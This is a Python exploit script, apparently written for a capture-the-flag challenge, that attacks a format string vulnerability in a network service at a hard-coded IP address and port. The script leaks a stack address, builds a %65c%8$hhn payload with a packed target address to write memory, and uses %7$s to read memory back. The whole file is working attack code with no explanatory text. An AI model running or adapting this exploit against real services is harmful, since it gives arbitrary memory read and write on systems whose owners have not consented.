#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.06)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)

s=newconn()
buf=leak_lld(s,2)
print("buf=",hex(buf))
target = buf - 0x200   # stack location above the buffer (main frame region)
print("target=",hex(target))
# write byte 0x41 to target using %8$hhn: format buffer[0:16], addr at buffer[16:24]
# format = %65c (prints 65 chars -> count=65=0x41) + %8$hhn
fmt = b"%65c%8$hhn" + b"A"*5  # pad to fill buffer[0:16]
# addr at buffer[16:24]: need target's 8 bytes. buffer is 23 bytes, buffer[16:23]=7 bytes, buffer[23]=OOB
addr_bytes = struct.pack("<Q", target)  # 8 bytes
payload = fmt[:16] + addr_bytes[:7]
print("payload len", len(payload))
d=ask(s, payload)
print("write call =>", repr(d[:80]))
# read back
r=readmem(s, target)
print("read target =>", repr(r[:80]))
s.close()
